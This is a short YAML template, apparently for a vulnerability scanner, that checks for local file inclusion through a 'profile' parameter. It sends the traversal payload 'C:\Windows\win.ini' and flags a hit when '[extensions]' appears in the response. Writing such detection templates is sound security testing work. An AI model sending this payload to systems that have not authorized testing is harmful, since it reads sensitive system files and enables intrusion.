id: lfi6-1275
name: 'Traversal in profile'
severity: high
type: active
tags:
  - lfi
  - traversal
  - file
description: 'Reads sensitive file via profile'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      profile:
        - 'C:\Windows\win.ini'
    matchers:
      - type: word
        part: body
        words:
          - '[extensions]'
